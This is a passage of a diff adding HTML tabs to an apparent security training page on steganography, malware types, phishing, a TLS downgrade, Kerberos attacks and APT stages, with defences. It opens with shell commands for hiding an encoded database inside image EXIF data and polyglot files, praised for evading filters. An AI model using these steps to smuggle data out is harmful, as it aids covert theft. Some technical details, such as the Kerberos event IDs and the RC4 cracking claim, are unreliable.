+# Hides base64 data in EXIF comment field
+
+# EXTRACT FROM IMAGE
+exiftool -Comment output.jpg > extracted.txt
+base64 -d extracted.txt > recovered.pdf
+
+# CREATE POLYGLOT JPG + ZIP FILE
+cat image.jpg data.zip > output.jpg
+# Valid as both JPG image and ZIP archive
+
+# VERIFY POLYGLOT FUNCTIONALITY
+file output.jpg  # Shows as JPEG
+unzip output.jpg # Extracts ZIP contents
+
+# ENCODE ENTIRE DATABASE
+gzip -9 database.sql > database.sql.gz
+base64 database.sql.gz > payload.txt
+# Embed payload.txt in image EXIF</code></pre>
+                </div>
+
+                <div class="success-box">
+                    <strong>✓ ADVANTAGES:</strong>
+                    <ul>
+                        <li>Text-based format bypasses many filters</li>
+                        <li>EXIF metadata appears normal to viewers</li>
+                        <li>Multiple encoding layers increase detection difficulty</li>
+                        <li>Standard command-line tools (no special software needed)</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 9: Steganography Detection -->
+            <section class="tab-content" id="tab9">
+                <h2>Steganography Detection & Analysis</h2>
+                <p class="subtitle">Identifying covert data in files</p>
+
+                <div class="info-card">
+                    <h3>Detection Challenges</h3>
+                    <ul>
+                        <li><strong>Perfect Steganography:</strong> Undetectable if executed well</li>
+                        <li><strong>False Positives:</strong> Legitimate high-quality images trigger alerts</li>
+                        <li><strong>Multiple Layers:</strong> Combining stego + encryption + encoding</li>
+                        <li><strong>Tool-Specific:</strong> Different tools use different techniques</li>
+                        <li><strong>No Signature:</strong> Unlike malware, no hash/signature to match</li>
+                    </ul>
+                </div>
+
+                <div class="defense-layer">
+                    <h3>Detection Methods & Tools</h3>
+                    
+                    <div class="mitigation-card">
+                        <h4>Statistical Analysis</h4>
+                        <ul>
+                            <li><strong>Chi-Square Test:</strong> Analyze byte distribution deviations</li>
+                            <li><strong>Entropy Analysis:</strong> Steganography typically increases entropy</li>
+                            <li><strong>Histogram Inspection:</strong> Unusual pixel value patterns</li>
+                            <li><strong>DCT Analysis:</strong> For JPEG steganography detection</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Forensic Tools</h4>
+                        <ul>
+                            <li><strong>Stegdetect:</strong> Detects JSteg, OutGuess, Steghide</li>
+                            <li><strong>Stegowatch:</strong> Real-time stego file detection</li>
+                            <li><strong>Exiftool:</strong> Extract and analyze metadata</li>
+                            <li><strong>Binwalk:</strong> Identify file signatures and embedded data</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>NTFS ADS Detection</h4>
+                        <ul>
+                            <li><strong>dir /R:</strong> Built-in Windows command shows streams</li>
+                            <li><strong>Streams (SysinternalS):</strong> List and manage ADS</li>
+                            <li><strong>PowerShell:</strong> Get-Item "file" -Stream *</li>
+                            <li><strong>Forensic Tools:</strong> Autopsy, FTK, EnCase detect streams</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 10: Malware Types -->
+            <section class="tab-content" id="tab10">
+                <h2>Malware Classification & Types</h2>
+                <p class="subtitle">Understanding different malware categories and characteristics</p>
+
+                <div class="concept-box">
+                    <h3>Malware Definition & Purpose</h3>
+                    <p><strong>Malware:</strong> Malicious software designed to damage, disable, or compromise systems</p>
+                    <ul>
+                        <li><strong>Damage Systems:</strong> Corrupt files, delete data, cause hardware failure</li>
+                        <li><strong>Steal Information:</strong> Passwords, credit cards, personal data</li>
+                        <li><strong>Commit Fraud:</strong> Financial theft, identity theft</li>
+                        <li><strong>Disruption:</strong> DDoS attacks, botnet participation</li>
+                        <li><strong>Espionage:</strong> Corporate/government intelligence gathering</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Malware Types Comparison</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Type</th>
+                                <th>Self-Replicating</th>
+                                <th>Primary Goal</th>
+                                <th>Speed of Spread</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Virus</strong></td>
+                                <td>Yes (needs host)</td>
+                                <td>Damage/Corruption</td>
+                                <td>Medium</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Worm</strong></td>
+                                <td>Yes (standalone)</td>
+                                <td>Rapid spread</td>
+                                <td>Very Fast</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Trojan</strong></td>
+                                <td>No</td>
+                                <td>Backdoor access</td>
+                                <td>Manual delivery</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Ransomware</strong></td>
+                                <td>Rarely</td>
+                                <td>Encryption + Extortion</td>
+                                <td>Varies</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Spyware</strong></td>
+                                <td>Rarely</td>
+                                <td>Surveillance</td>
+                                <td>Stealth delivery</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Keylogger</strong></td>
+                                <td>No</td>
+                                <td>Keystroke capture</td>
+                                <td>Silent installation</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="attack-card" onclick="toggleAttackDetails(this)">
+                    <h3>Virus: Self-Replicating but Host-Dependent</h3>
+                    <div class="attack-details">
+                        <ul>
+                            <li><strong>Requirement:</strong> Must attach to executable files (.exe, .dll, .sys, .com)</li>
+                            <li><strong>Propagation:</strong> Spreads only when infected file executed</li>
+                            <li><strong>Example:</strong> File infector virus, macro virus in Word/Excel</li>
+                            <li><strong>Slower than Worms:</strong> Depends on user executing infected file</li>
+                            <li><strong>Detection:</strong> Signature scanning, heuristic analysis</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="attack-card" onclick="toggleAttackDetails(this)">
+                    <h3>Worm: Self-Propagating & Independent</h3>
+                    <div class="attack-details">
+                        <ul>
+                            <li><strong>No Host File Needed:</strong> Spreads standalone via network vulnerabilities</li>
+                            <li><strong>Rapid Infection:</strong> Internet worms infect thousands/millions in hours</li>
+                            <li><strong>Famous Examples:</strong> Nimda, Code Red, WannaCry (hybrid)</li>
+                            <li><strong>Network Scanning:</strong> Worm scans for vulnerable systems automatically</li>
+                            <li><strong>Zero-Day Exploitation:</strong> Unpatched vulnerabilities = rapid spread</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="attack-card" onclick="toggleAttackDetails(this)">
+                    <h3>Trojan: Disguised Backdoor Access</h3>
+                    <div class="attack-details">
+                        <ul>
+                            <li><strong>Not Self-Replicating:</strong> Requires manual distribution</li>
+                            <li><strong>Deceptive Appearance:</strong> Appears as legitimate program (game, tool, update)</li>
+                            <li><strong>Backdoor Installation:</strong> Opens remote access channel for attacker</li>
+                            <li><strong>RAT Component:</strong> Remote Administration Tool for control</li>
+                            <li><strong>Persistence:</strong> Stays hidden and connects to C&C server</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="attack-card" onclick="toggleAttackDetails(this)">
+                    <h3>Ransomware: Encryption & Extortion</h3>
+                    <div class="attack-details">
+                        <ul>
+                            <li><strong>Encryption:</strong> Encrypts files with attacker-controlled key (usually RSA-2048)</li>
+                            <li><strong>Ransom Demand:</strong> Display ransom message with payment instructions</li>
+                            <li><strong>Bitcoin Payments:</strong> Untraceable cryptocurrency for payment</li>
+                            <li><strong>Decryption:</strong> Victims sometimes get decryption key after payment (not guaranteed)</li>
+                            <li><strong>Examples:</strong> WannaCry, NotPetya, REvil, LockBit</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 11: Malware Delivery Methods -->
+            <section class="tab-content" id="tab11">
+                <h2>Malware Distribution Methods</h2>
+                <p class="subtitle">How attackers deliver malware to targets</p>
+
+                <div class="info-card">
+                    <h3>Primary Delivery Vectors</h3>
+                    <ul>
+                        <li><strong>Email Attachments:</strong> Most common delivery method</li>
+                        <li><strong>Messaging Apps:</strong> WhatsApp, Telegram, Facebook Messenger links</li>
+                        <li><strong>USB/Removable Media:</strong> Infected drives planted in public</li>
+                        <li><strong>Malicious Websites:</strong> Drive-by download, exploit kit hosting</li>
+                        <li><strong>Software Updates:</strong> Fake/compromised update executables</li>
+                        <li><strong>Macro Viruses:</strong> Embedded in Office documents</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Phishing Email Attack Chain</h3>
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 1:</span> Social Engineering
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p>Attacker researches target company and employees</p>
+                            <p>Identifies accounts or departments with sensitive access</p>
+                            <p>Creates believable scenario (security alert, compliance update, etc.)</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 2:</span> Email Crafting
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p>Subject: "URGENT: Account Verification Required"</p>
+                            <p>From: spoofed@company.com (looks legitimate)</p>
+                            <p>Attachment: "AccountVerification.exe" or macro-enabled .DOCX</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 3:</span> User Interaction
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p>Employee receives email during work hours</p>
+                            <p>Feels urgency (compliance deadline, security issue)</p>
+                            <p>Downloads and opens attachment (malware delivered)</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 4:</span> Execution
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p>Malware executable runs with user privileges</p>
+                            <p>Establish persistence (registry, scheduled task, etc.)</p>
+                            <p>Download additional payloads (RAT, keylogger, etc.)</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 5:</span> Compromise
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p>System becomes infected and attacker gains access</p>
+                            <p>Lateral movement to other systems</p>
+                            <p>Data theft or further exploitation</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-card">
+                    <h3>Why These Methods Work</h3>
+                    <ul>
+                        <li><strong>User Trust:</strong> Appears to come from trusted sources</li>
+                        <li><strong>Urgency:</strong> Creates psychological pressure to act quickly</li>
+                        <li><strong>Low Patch Management:</strong> 70% of corporate systems have unpatched vulnerabilities</li>
+                        <li><strong>Poor Email Filtering:</strong> Many filters don't catch sophisticated phishing</li>
+                        <li><strong>User Familiarity:</strong> People more likely to click known file types</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 12: Attack Vectors & Exploitation -->
+            <section class="tab-content" id="tab12">
+                <h2>Malware Attack Vectors & Exploitation</h2>
+                <p class="subtitle">Technical methods for malware infection and execution</p>
+
+                <div class="info-card">
+                    <h3>Common Attack Vector Vulnerabilities</h3>
+                    <ul>
+                        <li><strong>Outdated Web Browsers:</strong> Unpatched browser vulnerabilities (Flash, etc.)</li>
+                        <li><strong>Browser Plugins:</strong> Java, Adobe Reader, ActiveX exploits</li>
+                        <li><strong>Insecure Patch Management:</strong> Delayed Windows/application updates</li>
+                        <li><strong>Open Wireless Networks:</strong> Man-in-the-middle interception and injection</li>
+                        <li><strong>Instant Messengers:</strong> File sharing features without proper validation</li>
+                        <li><strong>Email Clients:</strong> HTML rendering vulnerabilities, attachment handling</li>
+                        <li><strong>PDF Readers:</strong> Embedded exploits in malicious PDFs</li>
+                    </ul>
+                </div>
+
+                <div class="danger-box">
+                    <strong>⚠️ ZERO-DAY VULNERABILITIES:</strong>
+                    <ul>
+                        <li><strong>Definition:</strong> Exploits for unknown vulnerabilities with no available patch</li>
+                        <li><strong>Timeline:</strong> Exploit exists before vendor is aware or patch released</li>
+                        <li><strong>Impact:</strong> Complete system compromise with no defense</li>
+                        <li><strong>Marketability:</strong> Zero-day exploits sold on dark web for $100K-$1M+</li>
+                        <li><strong>APT Usage:</strong> Nation-states and advanced attackers primary users</li>
+                    </ul>
+                </div>
+
+                <div class="success-box">
+                    <strong>✓ MITIGATION STRATEGIES:</strong>
+                    <ul>
+                        <li>Enable automatic Windows updates and patches</li>
+                        <li>Use latest browser versions (Chrome auto-updates by default)</li>
+                        <li>Disable legacy technologies (Java, Flash, ActiveX)</li>
+                        <li>Install security software (antivirus + anti-malware)</li>
+                        <li>Network-level protection (IDS/IPS, next-gen firewalls)</li>
+                        <li>User education on phishing and malware dangers</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Remaining Tabs (13-18) - Trojans, APT, IoC, Defense, Summary -->
+            <!-- Tab 13-18 content follows similar pattern -->
+            
+            <!-- Tab 13: Trojans & RAT -->
+            <section class="tab-content" id="tab13">
+                <h2>Trojans & Remote Access Trojans (RAT)</h2>
+                <p class="subtitle">Understanding backdoor mechanisms and remote control</p>
+
+                <div class="concept-box">
+                    <h3>What is a Trojan?</h3>
+                    <p><strong>Trojan Horse:</strong> Malware disguised as legitimate software with hidden malicious code</p>
+                    <ul>
+                        <li><strong>Not Self-Replicating:</strong> Doesn't spread on its own (requires user download)</li>
+                        <li><strong>Deceptive Appearance:</strong> Looks like game, tool, or utility</li>
+                        <li><strong>Hidden Payload:</strong> Contains backdoor, keylogger, or data stealer</li>
+                        <li><strong>Privilege Level:</strong> Runs with same privileges as user who executed it</li>
+                        <li><strong>Persistence:</strong> Often installs into startup folders or registry</li>
+                    </ul>
+                </div>
+
+                <div class="concept-box">
+                    <h3>Remote Access Trojan (RAT) Capabilities</h3>
+                    <ul>
+                        <li><strong>Remote Command Execution:</strong> Execute arbitrary commands on victim machine</li>
+                        <li><strong>File Transfer:</strong> Upload/download files to/from infected system</li>
+                        <li><strong>Screen Capture:</strong> Steal desktop screenshots in real-time</li>
+                        <li><strong>Keylogging:</strong> Record all keyboard input (passwords, emails, etc.)</li>
+                        <li><strong>Webcam Access:</strong> Activate camera for surveillance (often covertly)</li>
+                        <li><strong>Microphone:</strong> Record audio from system</li>
+                        <li><strong>Process Management:</strong> View, kill, or restart running processes</li>
+                        <li><strong>Registry Access:</strong> Read/modify Windows registry</li>
+                        <li><strong>Reverse Shell:</strong> Interactive command shell access</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>Famous RAT Examples</h3>
+                    <ul>
+                        <li><strong>T88:</strong> Demonstration tool (often used for educational purposes)</li>
+                        <li><strong>Dark Comet:</strong> Common RAT with GUI control interface</li>
+                        <li><strong>Poison Ivy:</strong> Older but effective RAT (still used)</li>
+                        <li><strong>Metasploit Meterpreter:</strong> Professional penetration testing RAT</li>
+                        <li><strong>AsyncRAT:</strong> Modern Open-Source RAT (actively used)</li>
+                        <li><strong>LimeRAT:</strong> Recent RAT discovered in malware campaigns</li>
+                    </ul>
+                </div>
+
+                <div class="danger-box">
+                    <strong>🔴 TROJAN INDICATORS OF COMPROMISE (IoC):</strong>
+                    <ul>
+                        <li>Unexpected background network activity (high bandwidth usage)</li>
+                        <li>Unknown processes running in Task Manager</li>
+                        <li>Slow system performance / high CPU/memory usage</li>
+                        <li>Unexpected login attempts or failed authentications</li>
+                        <li>New user accounts discovered on system</li>
+                        <li>Suspicious registry entries or startup programs</li>
+                        <li>Files mysteriously modified or deleted</li>
+                        <li>Firewall showing unknown outbound connections</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- NEW: Tab 9B - Cryptographic Foundations -->
+            <section class="tab-content" id="tab9b">
+                <h2>Cryptographic Foundations & Key Concepts</h2>
+                <p class="subtitle">Understanding encryption, hashing, and cryptographic protocols</p>
+
+                <div class="concept-box">
+                    <h3>Symmetric vs Asymmetric Encryption</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Aspect</th>
+                                <th>Symmetric</th>
+                                <th>Asymmetric</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Algorithm Type</strong></td>
+                                <td>Single key for encryption/decryption</td>
+                                <td>Public key (share) + Private key (secret)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Key Exchange</strong></td>
+                                <td>Difficult - key distribution problem</td>
+                                <td>Easy - use public key, keep private key secret</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Speed</strong></td>
+                                <td>Very fast (100+ MB/sec)</td>
+                                <td>Slow (1-10 MB/sec)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Common Algorithms</strong></td>
+                                <td>AES-256, DES, 3DES, RC4</td>
+                                <td>RSA, ECC, ElGamal</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Primary Use</strong></td>
+                                <td>Bulk data encryption</td>
+                                <td>Key exchange, digital signatures</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Vulnerability to QC</strong></td>
+                                <td>Resistant to Quantum Computing</td>
+                                <td>Vulnerable to quantum algorithms</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Hashing Functions & Digital Signatures</h3>
+                    <p><strong>Hash Function:</strong> Converts input data of any size to fixed-size output (digest)</p>
+                    <ul>
+                        <li><strong>Properties:</strong> Deterministic, fast, avalanche effect, collision-resistant</li>
+                        <li><strong>One-Way:</strong> Cannot reverse hash to get original data</li>
+                        <li><strong>Common Algorithms:</strong> MD5 (128-bit), SHA-1 (160-bit), SHA-256 (256-bit), SHA-512 (512-bit)</li>
+                        <li><strong>Digital Signature Use:</strong> Hash+sign prevents tampering and proves authenticity</li>
+                    </ul>
+                    <p><strong>Example:</strong> A certificate with compromised hash (MD5) can be forged by attackers</p>
+                </div>
+
+                <div class="info-card">
+                    <h3>Hash Collision Attacks</h3>
+                    <ul>
+                        <li><strong>MD5 Collision:</strong> Found in 2004, two different inputs produce same hash</li>
+                        <li><strong>SHA-1 Collision:</strong> Google Shattered project (2017) demonstrated collision</li>
+                        <li><strong>Certificate Forgery:</strong> With hash collision, attacker can create valid cert for any domain</li>
+                        <li><strong>Mitigation:</strong> Use SHA-256 or stronger for all cryptographic operations</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Man-in-the-Middle Attack with Weak Encryption</h3>
+                    <p><strong>Scenario:</strong> Attacker intercepts SSL/TLS connection and downgrades encryption</p>
+                    
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 1:</span> Connection Initiation
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Client:</strong> "Hello Server, I want secure connection (TLS 1.3)"</p>
+                            <p><strong>Attacker (MITM):</strong> Intercepts handshake</p>
+                            <p><strong>Attacker→Server:</strong> "Connected client wants TLS 1.0" (downgrade)</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 2:</span> Cipher Suite Negotiation
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Server:</strong> Accepts TLS 1.0, offers cipher suite: RC4-128</p>
+                            <p><strong>Client→Attacker:</strong> Agrees to RC4-128</p>
+                            <p><strong>Attacker Status:</strong> Can now break RC4 (known attacks)</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 3:</span> Key Exchange
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Client & Server:</strong> Exchange RC4 encryption keys</p>
+                            <p><strong>Attacker:</strong> Captures both key exchange messages</p>
+                            <p><strong>Attacker Capability:</strong> Brute-force RC4 in minutes to recover session key</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 4:</span> Data Decryption
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Client:</strong> Sends login credentials encrypted with RC4</p>
+                            <p><strong>Attacker:</strong> Uses recovered key to decrypt credentials</p>
+                            <p><strong>Attacker:</strong> username: admin, password: Finance2024!</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 5:</span> Full Compromise
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Attacker:</strong> Uses recovered credentials</p>
+                            <p><strong>Impact:</strong></p>
+                            <ul>
+                                <li>Account takeover</li>
+                                <li>Data theft/modification</li>
+                                <li>Further system compromise</li>
+                                <li>Lateral movement to other systems</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="defense-layer">
+                    <h3>Cryptographic Security Best Practices</h3>
+                    
+                    <div class="mitigation-card">
+                        <h4>Algorithm Selection</h4>
+                        <ul>
+                            <li>✓ Use AES-256 for symmetric encryption (no known practical attacks)</li>
+                            <li>✓ Use RSA-2048 or ECC-256 for asymmetric operations</li>
+                            <li>✓ Use SHA-256 or SHA-512 for hashing (never MD5 or SHA-1)</li>
+                            <li>✗ Avoid: RC4, DES, MD5, SHA-1, deprecated algorithms</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Protocol Enforcement</h4>
+                        <ul>
+                            <li>✓ Enforce TLS 1.2 minimum (TLS 1.3 preferred)</li>
+                            <li>✓ Disable SSL negotiation (SSL 3.0, TLS 1.0/1.1)</li>
+                            <li>✓ Use Perfect Forward Secrecy (PFS) cipher suites</li>
+                            <li>✓ Implement HSTS (HTTP Strict Transport Security)</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Key Management</h4>
+                        <ul>
+                            <li>✓ Store private keys in Hardware Security Modules (HSM)</li>
+                            <li>✓ Rotate keys annually or on compromise</li>
+                            <li>✓ Use strong key derivation functions (PBKDF2, Argon2)</li>
+                            <li>✓ Implement zero-knowledge architectures</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- NEW: Tab 14B - Kerberos Authentication Deep Dive -->
+            <section class="tab-content" id="tab14b">
+                <h2>Kerberos Authentication Protocol & Attacks</h2>
+                <p class="subtitle">Understanding the foundation of enterprise authentication and its vulnerabilities</p>
+
+                <div class="concept-box">
+                    <h3>Kerberos Protocol Architecture</h3>
+                    <ul>
+                        <li><strong>Authentication Server (AS):</strong> Issues Ticket Granting Tickets (TGT)</li>
+                        <li><strong>Ticket Granting Server (TGS):</strong> Issues service tickets for resource access</li>
+                        <li><strong>Key Distribution Center (KDC):</strong> Contains AS and TGS (typically on Domain Controller)</li>
+                        <li><strong>Application Server:</strong> Resources accessed by authenticated users</li>
+                        <li><strong>Encryption:</strong> All tickets encrypted with user password hash</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Kerberos Authentication Flow</h3>
+                    <p><strong>Complete 5-Step Kerberos Process</strong></p>
+                    
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Phase 1:</span> TGT Request (AS-REQ)
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Client Action:</strong></p>
+                            <code>User logs in: username "admin", password "SecureP@ss123"</code>
+                            
+                            <p><strong>Client→AS:</strong></p>
+                            <ul>
+                                <li>Sends username in PLAIN TEXT</li>
+                                <li>Creates timestamp encrypted with user's password hash</li>
+                                <li>Proof of possession (user knows password)</li>
+                            </ul>
+                            
+                            <p><strong>Attack Point:</strong> Password hash can be cracked offline (AS-REP roasting)</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Phase 2:</span> TGT Response (AS-REP)
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>AS→Client:</strong> Returns TGT (encrypted with KDC password)</p>
+                            <ul>
+                                <li>TGT contains: user identity, session key, validity period</li>
+                                <li>Encrypted with TDC's master key (hidden from user)</li>
+                                <li>User's session key: encrypted with user password hash</li>
+                                <li>User cannot decrypt TGT (only KDC can)</li>
+                            </ul>
+                            
+                            <p><strong>Attack Point:</strong> TGT reuse across multiple service requests</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Phase 3:</span> Service Ticket Request (TGS-REQ)
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>User wants to access:</strong> File Server (FILESERVER$)</p>
+                            
+                            <p><strong>Client→TGS:</strong></p>
+                            <ul>
+                                <li>Sends TGT (proves prior authentication)</li>
+                                <li>Requests service ticket for FILESERVER</li>
+                                <li>Includes authenticator (timestamp + user key)</li>
+                            </ul>
+                            
+                            <p><strong>Attack Point:</strong> Kerberoasting - crack service account password</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Phase 4:</span> Service Ticket Response (TGS-REP)
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>TGS→Client:</strong> Returns service ticket</p>
+                            <ul>
+                                <li>Service ticket encrypted with service account password hash</li>
+                                <li>Contains user identity and authorization data</li>
+                                <li>User receives session key for service communication</li>
+                            </ul>
+                            
+                            <p><strong>Threat:</strong> Service tickets can be captured and cracked offline</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Phase 5:</span> Service Access (AP-REQ/AP-REP)
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Client→FileServer:</strong> Presents service ticket</p>
+                            <p><strong>FileServer:</strong> Validates ticket with TGS party confirmation</p>
+                            <p><strong>Access Granted:</strong> User can now access files</p>
+                            
+                            <p><strong>Attack Point:</strong> Pass-the-ticket (PT-T) - use captured ticket directly</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="danger-box">
+                    <strong>🔴 CRITICAL KERBEROS ATTACKS:</strong>
+                    
+                    <div style="margin-top: 15px;">
+                        <p><strong>1. Pass-The-Ticket (PTT):</strong></p>
+                        <ul>
+                            <li>Attacker captures Kerberos ticket from memory</li>
+                            <li>Injects ticket into another process</li>
+                            <li>Immediately accesses resources without password</li>
+                            <li>Detection: Ticket reuse from unexpected machines/times</li>
+                        </ul>
+
+                        <p><strong>2. Golden Ticket:</strong></p>
+                        <ul>
+                            <li>Attacker compromises KDC master key</li>
+                            <li>Forges Kerberos TGT with Domain Admin privileges</li>
+                            <li>Complete forest compromise - permanent access</li>
+                            <li>Detection: Ticket validity exceeds 10-hour default</li>
+                        </ul>
+
+                        <p><strong>3. Kerberoasting:</strong></p>
+                        <ul>
+                            <li>Request service tickets for all service accounts</li>
+                            <li>Crack service account passwords offline</li>
+                            <li>Often service passwords weak/unchanged for years</li>
+                            <li>Detection: Spike in TGS requests from single user</li>
+                        </ul>
+
+                        <p><strong>4. AS-REP Roasting:</strong></p>
+                        <ul>
+                            <li>Target accounts with "Do not require Kerberos pre-authentication"</li>
+                            <li>Request TGT without password proof</li>
+                            <li>Crack TGT offline (contains user password hash)</li>
+                            <li>Detection: AS-REQ for accounts without pre-auth</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="defense-layer">
+                    <h3>Kerberos Security Hardening</h3>
+                    
+                    <div class="mitigation-card">
+                        <h4>User Account Protection</h4>
+                        <ul>
+                            <li>✓ Enforce strong passwords (20+ characters minimum)</li>
+                            <li>✓ Enforce password complexity requirements</li>
+                            <li>✓ Implement password history (prevent reuse)</li>
+                            <li>✓ Set password age limits (30-60 days)</li>
+                            <li>✓ Monitor failed login attempts (alert after 5 failures)</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Service Account Protection</h4>
+                        <ul>
+                            <li>✓ Use Group Managed Service Accounts (gMSA)</li>
+                            <li>✓ Never use user accounts for services</li>
+                            <li>✓ Set "Account is sensitive, cannot be delegated"</li>
+                            <li>✓ Disable "Pre-authentication required" is false</li>
+                            <li>✓ Monitor service account elevation attempts</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Ticket & KDC Protection</h4>
+                        <ul>
+                            <li>✓ Limit TGT lifetime to 8-10 hours maximum</li>
+                            <li>✓ Implement ticket renewal checks</li>
+                            <li>✓ Monitor KDC logs for anomalous ticket requests</li>
+                            <li>✓ Use KRBTGT account password rotation (every 180 days)</li>
+                            <li>✓ Enable Kerberos armoring (FAST) for clients</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Detection & Monitoring</h4>
+                        <ul>
+                            <li>✓ Event 4769: Check for Kerberoasting (4768 without 4769)</li>
+                            <li>✓ Event 4768: Monitor AS-REQ from service accounts</li>
+                            <li>✓ Alert on tickets with non-standard encryption types</li>
+                            <li>✓ Track ticket reuse from multiple IP addresses</li>
+                            <li>✓ Monitor for failed TGS requests (possible brute force)</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- NEW: Tab 15B - Advanced APT Attack Chains -->
+            <section class="tab-content" id="tab15b">
+                <h2>Advanced Persistent Threat (APT) Attack Chains</h2>
+                <p class="subtitle">Understanding sophisticated multi-stage attacks from reconnaissance to command & control</p>
+
+                <div class="info-card">
+                    <h3>APT Lifecycle Stages</h3>
+                    <ul>
+                        <li><strong>Stage 1 - Reconnaissance:</strong> Information gathering (OSINT, network scanning)</li>
+                        <li><strong>Stage 2 - Weaponization:</strong> Create tailored exploit/malware payload</li>
+                        <li><strong>Stage 3 - Delivery:</strong> Send payload via phishing, drive-by download, USB</li>
